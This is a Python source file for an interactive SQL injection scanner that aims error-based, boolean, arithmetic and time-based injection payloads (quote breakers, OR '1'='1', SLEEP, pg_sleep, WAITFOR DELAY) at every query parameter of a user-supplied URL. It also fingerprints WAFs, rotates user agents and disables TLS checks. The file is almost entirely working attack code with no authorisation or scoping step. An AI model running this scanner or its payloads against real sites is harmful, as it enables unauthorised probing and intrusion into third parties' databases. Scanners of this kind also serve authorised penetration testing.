import urllib.parse
import random
import sys
import time
from time import sleep
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests

requests.packages.urllib3.disable_warnings()

R = "\033[31m"
N = "\033[0m"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
]

DB_ERRORS = {
    "MySQL": [
        "you have an error in your sql syntax",
        "mysql_fetch",
        "warning: mysql",
        "supplied argument is not a valid mysql",
        "check the manual that corresponds to your mariadb",
        "check the manual that corresponds to your mysql",
    ],
    "PostgreSQL": [
        "postgresql query failed",
        "pg_query",
        "syntax error at or near",
        "unterminated quoted string",
        "pg_exec",
        "invalid input syntax for type",
    ],
    "SQL Server": [
        "microsoft oledb provider for sql server",
        "unclosed quotation mark",
        "quoted string not properly terminated",
        "odbc sql server driver",
        "microsoft sql native client",
    ],
    "SQLite": [
        "sqlite3.operationalerror",
        "sqlite.exception",
        "unterminated string",
        "near \"",
        "sqlite3::query",
    ],
    "Oracle": [
        "ora-00933",
        "ora-00936",
        "ora-01756",
        "oracle error",
        "quoted string not properly terminated",
    ],
}

SYNTAX_PROBES = [
    "'",
    "\"",
    "\\",
    "')",
    "\")",
    "'))",
    "\"))",
    "';",
    "\";",
]

# Для числовых значений (например id=1): заменяем/дополняем арифметикой
NUMERIC_MATH_PAIRS = [
    ("0", "-0"),
    ("+0", "-1"),
]

# Суффиксы, добавляемые к исходному значению
BOOLEAN_SUFFIX_PAIRS = [
    (" AND 1=1", " AND 1=2"),
    (" AND 2=2", " AND 2=3"),
    ("' AND '1'='1", "' AND '1'='2"),
    ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
    ("') AND ('1'='1", "') AND ('1'='2"),
    ("\") AND (\"1\"=\"1", "\") AND (\"1\"=\"2"),
    ("' OR '1'='1", "' OR '1'='2"),
    ("\" OR \"1\"=\"1", "\" OR \"1\"=\"2"),
]

TIME_PROBES = [
    ("Generic SLEEP", " AND SLEEP(3)"),
    ("String SLEEP", "' AND SLEEP(3) AND '1'='1"),
    ("Quote SLEEP", "\" AND SLEEP(3) AND \"1\"=\"1"),
    ("PG pg_sleep", "';SELECT pg_sleep(3)--"),
    ("MSSQL WAITFOR", "';WAITFOR DELAY '0:0:3'--"),
    ("MSSQL Quote WAITFOR", "';WAITFOR DELAY '0:0:3'-- -"),
]


def red(text):
    print(f"{R}{text}{N}")
    sleep(0.01)


def red_input(prompt):
    sys.stdout.write(f"{R}{prompt}")
    sys.stdout.flush()
    value = input()
    sys.stdout.write(N)
    return value


def clear():
    sys.stdout.write("\033[0m\033[2J\033[H")
    sys.stdout.flush()


def banner():
    red("")
    red("  ╔══════════════════════════════════════╗")
    red("  ║       HEAVY-DUTY SQLI ENGINE         ║")
    red("  ║    bypass · WAF detect · heuristic   ║")
    red("  ╚══════════════════════════════════════╝")
    red("")


def check_waf(headers, body):
    server = headers.get("server", "").lower()
    combined = server + " " + str(body).lower()
    waf_signatures = [
        "cloudflare",
        "incapsula",
        "sucuri",
        "ddos-guard",
        "akamai",
        "perimeterx",
        "cf-ray",
    ]
    for sig in waf_signatures:
        if sig in combined:
            return sig.upper()
    return None


def detect_db_error(body_lower):
    for db, errs in DB_ERRORS.items():
        if any(err in body_lower for err in errs):
            return db
    return None


def build_param_url(parsed, params, param, new_value):
    updated = {k: list(v) for k, v in params.items()}
    updated[param] = [new_value]
    encoded_query = urllib.parse.urlencode(updated, doseq=True, quote_via=urllib.parse.quote)
    return urllib.parse.urlunparse((
        parsed.scheme,
        parsed.netloc,
        parsed.path,
        parsed.params,
        encoded_query,
        parsed.fragment,
    ))


def fetch_timed(session, url, timeout=10.0):
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    start_t = time.perf_counter()
    res = session.get(url, headers=headers, timeout=timeout)
    elapsed = time.perf_counter() - start_t
    return res, elapsed


def evaluate_url(session, test_url, base_len, base_status, timeout):
    try:
        res, elapsed = fetch_timed(session, test_url, timeout=timeout)
        body_lower = res.text.lower()
        db_err = detect_db_error(body_lower)
        len_diff = abs(len(res.text) - base_len)
        return {
            "url": test_url,
            "status": res.status_code,
            "length": len(res.text),
            "len_diff": len_diff,
            "status_changed": res.status_code != base_status,
            "elapsed": elapsed,
            "db_err": db_err,
            "timeout": False,
        }
    except requests.exceptions.Timeout:
        return {
            "url": test_url,
            "status": None,
            "length": 0,
            "len_diff": 0,
            "status_changed": False,
            "elapsed": timeout,
            "db_err": None,
            "timeout": True,
        }
    except Exception:
        return None


def analyze_target(base_url):
    session = requests.Session()
    session.verify = False
    adapter = requests.adapters.HTTPAdapter(pool_connections=20, pool_maxsize=20)
    session.mount("http://", adapter)
    session.mount("https://", adapter)

    parsed = urllib.parse.urlparse(base_url)
    if not parsed.query:
        red("[-] URL must contain parameters (e.g. http://target.com/page.php?id=1)")
        return

    params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    param_keys = list(params.keys())

    red(f"[*] target host    : {parsed.netloc}")
    red(f"[*] target path    : {parsed.path}")
    red(f"[*] target params  : {', '.join(param_keys)}")
    red("[*] probing target baseline & WAF defense...")

    samples = []
    waf_detected = None
    for idx in range(3):
        try:
            r, el = fetch_timed(session, base_url, timeout=10.0)
            samples.append((r.status_code, len(r.text), el))
            if idx == 0:
                waf_detected = check_waf(r.headers, r.text)
        except Exception:
            pass

    if not samples:
        red("[-] Warning: Failed to fetch baseline target response.")
        return

    base_status = samples[0][0]
    base_len = int(sum(x[1] for x in samples) / len(samples))
    base_elapsed = sum(x[2] for x in samples) / len(samples)
    len_jitter = max(x[1] for x in samples) - min(x[1] for x in samples)
    req_timeout = max(12.0, base_elapsed + 7.5)

    if waf_detected:
        red(f"[!] WAF / Protection Detected: {waf_detected}")
    else:
        red("[+] WAF Check      : No explicit WAF signature identified")
    red(f"[*] Baseline       : HTTP {base_status} | ~{base_len} bytes (jitter {len_jitter}B) | avg {base_elapsed:.2f}s")

    red("[*] deploying heavy-duty multi-vector analysis...")
    sleep(0.03)
    red("")

    any_finding = False
    noise_floor = max(40, int(base_len * 0.04), len_jitter * 2)

    for param in param_keys:
        param_finding = False
        red(f"[*] testing injection vector -> parameter [{param}]")
        orig_val = params[param][0] if params[param] else "1"
        is_numeric = orig_val.strip().isdigit()

        # 1. Параллельная проверка синтаксических зондов
        syntax_urls = {
            p: build_param_url(parsed, params, param, orig_val + p)
            for p in SYNTAX_PROBES
        }
        with ThreadPoolExecutor(max_workers=6) as pool:
            future_map = {
                pool.submit(evaluate_url, session, u, base_len, base_status, req_timeout): p
                for p, u in syntax_urls.items()
            }
            for fut in as_completed(future_map):
                payload = future_map[fut]
                info = fut.result()
                if not info:
                    continue
                if info["db_err"]:
                    red(f"    [+] ERROR-BASED SIGNAL | DB: {info['db_err']}")
                    red(f"        Payload: {payload}")
                    red(f"        URL    : {info['url']}")
                    param_finding = True
                    any_finding = True
                    break

        # 2. Арифметическая проверка для числовых параметров
        if not param_finding and is_numeric:
            for a_suffix, b_suffix in NUMERIC_MATH_PAIRS:
                url_a = build_param_url(parsed, params, param, orig_val + a_suffix)
                url_b = build_param_url(parsed, params, param, orig_val + b_suffix)
                info_a = evaluate_url(session, url_a, base_len, base_status, req_timeout)
                info_b = evaluate_url(session, url_b, base_len, base_status, req_timeout)
                if not info_a or not info_b:
                    continue

                if info_a["db_err"] or info_b["db_err"]:
                    db_name = info_a["db_err"] or info_b["db_err"]
                    red(f"    [+] ERROR-BASED SIGNAL | DB: {db_name}")
                    red(f"        Payload: {orig_val}{a_suffix} / {orig_val}{b_suffix}")
                    param_finding = True
                    any_finding = True
                    break

                a_matches_base = (
                    info_a["status"] == base_status
                    and info_a["len_diff"] <= noise_floor
                )
                b_differs = (
                    info_b["status"] != info_a["status"]
                    or abs(info_b["length"] - info_a["length"]) > noise_floor
                )
                if a_matches_base and b_differs:
                    red("    [+] NUMERIC / ARITHMETIC DIFFERENTIAL SIGNAL")
                    red(f"        Match  : {orig_val}{a_suffix} (len={info_a['length']}, status={info_a['status']})")
                    red(f"        Diff   : {orig_val}{b_suffix} (len={info_b['length']}, status={info_b['status']})")
                    param_finding = True
                    any_finding = True
                    break

        # 3. Булева проверка пар условий относительно baseline
        if not param_finding:
            for true_suf, false_suf in BOOLEAN_SUFFIX_PAIRS:
                url_t = build_param_url(parsed, params, param, orig_val + true_suf)
                url_f = build_param_url(parsed, params, param, orig_val + false_suf)
                info_t = evaluate_url(session, url_t, base_len, base_status, req_timeout)
                info_f = evaluate_url(session, url_f, base_len, base_status, req_timeout)
                if not info_t or not info_f:
                    continue

                if info_t["db_err"] or info_f["db_err"]:
                    db_name = info_t["db_err"] or info_f["db_err"]
                    red(f"    [+] ERROR-BASED SIGNAL | DB: {db_name}")
                    red(f"        Payload: {true_suf} / {false_suf}")
                    param_finding = True
                    any_finding = True
                    break

                true_matches_base = (
                    info_t["status"] == base_status
                    and info_t["len_diff"] <= noise_floor
                )
                false_differs = (
                    info_f["status"] != info_t["status"]
                    or abs(info_f["length"] - info_t["length"]) > noise_floor
                )
                if true_matches_base and false_differs:
                    red("    [+] BOOLEAN-BASED DIFFERENTIAL SIGNAL")
                    red(f"        True   : {true_suf} (len={info_t['length']}, status={info_t['status']})")
                    red(f"        False  : {false_suf} (len={info_f['length']}, status={info_f['status']})")
                    param_finding = True
                    any_finding = True
                    break

        # 4. Временная проверка с двойным подтверждением
        if not param_finding:
            delay_target = base_elapsed + 2.4
            for label, delay_suf in TIME_PROBES:
                url_d = build_param_url(parsed, params, param, orig_val + delay_suf)
                info_1 = evaluate_url(session, url_d, base_len, base_status, req_timeout)
                if not info_1:
                    continue
                if info_1["db_err"]:
                    red(f"    [+] ERROR-BASED SIGNAL | DB: {info_1['db_err']}")
                    red(f"        Payload: {delay_suf}")
                    param_finding = True
                    any_finding = True
                    break

                if info_1["timeout"] or info_1["elapsed"] >= delay_target:
                    info_2 = evaluate_url(session, url_d, base_len, base_status, req_timeout)
                    if info_2 and (info_2["timeout"] or info_2["elapsed"] >= delay_target):
                        red(f"    [+] TIME-BASED SIGNAL ({label}) | Confirmed twice")
                        red(f"        Payload: {delay_suf}")
                        red(f"        Latency: {info_1['elapsed']:.2f}s / {info_2['elapsed']:.2f}s (base {base_elapsed:.2f}s)")
                        param_finding = True
                        any_finding = True
                        break

        if not param_finding:
            red(f"    [-] parameter [{param}] showed no clear SQLi signal")
        red("")

    red("[*] scan report summary:")
    if any_finding:
        red("[!] Potential SQL injection indicators detected; verify manually.")
    else:
        red("[-] No clear SQL injection indicators found in tested parameters.")
    red("")


def sqli_scanner_menu():
    try:
        banner()
        red("")
        target_input = red_input("  target url (e.g. /library/item?id=) > ").strip()

        if not target_input:
            red("  [-] empty target")
            return

        if not target_input.startswith(("http://", "https://")):
            target_input = "http://" + target_input

        red("")
        analyze_target(target_input)

    except KeyboardInterrupt:
        red("")
        red("  [!] stopped")
        red("")
        sleep(0.5)